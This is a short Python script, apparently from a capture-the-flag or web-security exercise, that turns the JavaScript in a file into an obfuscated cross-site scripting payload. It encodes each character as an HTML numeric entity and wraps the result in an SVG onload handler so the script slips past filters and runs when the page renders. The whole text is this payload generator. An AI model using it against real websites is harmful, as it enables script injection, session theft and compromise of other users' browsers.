FILE="input3.txt"

with open(FILE) as f:
    file = f.read()

p = "".join(x for x in file.split("\n"))

ret = ""
for c in p:
    ret += f"&#00{ord(c)}"

print(f"<svg/onload=\"javascript:{ret}\">")
